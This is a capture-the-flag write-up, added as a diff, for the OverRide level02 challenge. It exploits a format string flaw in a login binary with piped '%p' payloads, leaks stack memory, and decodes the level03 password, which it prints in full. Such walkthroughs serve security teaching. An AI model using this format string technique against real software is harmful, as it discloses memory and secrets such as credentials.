@@ -1,0 +1,138 @@
+For this exercise we have a prompt that asks us for a username and a password.
+
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: test
+--[ Password: 1234
+*****************************************
+test does not have access
+
+And at the end the binary prints the username value.
+Looking at the assembly of the print, we see a call to printf.
+This call is made with the variable username only and no modifier.
+This means this printf is vulnerable to the format string attack.
+
+By sending few '%p' it results in the print of some addresses.
+
+level02@OverRide:~$ (python -c 'print("%p " * 10)') | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe500 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 (nil) (nil) (nil)  does not have access!
+
+We can understand that the "0x2a2a2a2a2a2a2a2a" is the content of the printf for the last line of the print from the binary.
+This corresponds to this line:
+
+*****************************************
+
+This means we can display the content of the local value in the binary.
+Let's see in more details the assembly :
+
+   0x0000000000400898 <+132>:	mov    $0x400bb0,%edx		"r"
+   0x000000000040089d <+137>:	mov    $0x400bb2,%eax		"/home/users/level03/.pass"
+   0x00000000004008a2 <+142>:	mov    %rdx,%rsi
+   0x00000000004008a5 <+145>:	mov    %rax,%rdi
+   0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>		fopen("/home/users/level03/.pass", "r');
+
+The binary opens the .pass from level03.
+
+   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt> 		fread(tab2[160], 41, 1, file pass );
+
+The content of the file is read and stocked into a buffer.
+
+This means that the content of the .pass file is somewhere in the stack.
+We can now try different option on our format string exploit to discover more content on the stack.
+
+level02@OverRide:~$ (python -c 'print("%p " * 100)') | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+
+This is a lot of information, let's clear that up a bit :
+
+0x7fffffffe4f0
+(nil)
+0x70
+0x2a2a2a2a2a2a2a2a -> "****************"
+0x2a2a2a2a2a2a2a2a -> "****************"
+0x7fffffffe6e8
+0x1f7ff9a08
+0x2570257025702570 -> "%p %p %p ...."
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570 -> same here
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570
+0x2570257025702570
+0x100702570
+(nil)
+0x756e505234376848 -> This is the content of the read !
+0x45414a3561733951
+0x377a7143574e6758
+0x354a35686e475873
+0x48336750664b394d
+(nil)
+0x7025207025207025
+0x2520702520702520
+0x2070252070252070
+0x7025207025207025
+0x2520702520702520 
+0x2070252070252070
+
+
+0x756e505234376848 = unPR47hH
+0x45414a3561733951 = EAJ5as9Q
+0x377a7143574e6758 = 7zqCWNgX
+0x354a35686e475873 = 5J5hnGXs
+0x48336750664b394d = H3gPfK9M
+
+unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+
+It looks like a flag !
+Spoiler alert, we tried to log in Level03 with the flag and it didn't work.
+We took a look at the type of the ELF :
+
+level02@OverRide:~$ readelf -h ./level02 
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x400730
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          4976 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         8
+  Size of section headers:           64 (bytes)
+  Number of section headers:         30
+  Section header string table index: 27
+
+It's in little endian, what if we reverse it to big endian ?
+
+0x4868373452506E75 = Hh74RPnu
+0x51397361354A4145 = Q9sa5JAE
+0x58674E5743717A37 = XgNWCqz7
+0x7358476E68354A35 = sXGnh5J5
+0x4D394B6650673348 = M9KfPg3H
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H is the good flag ! 
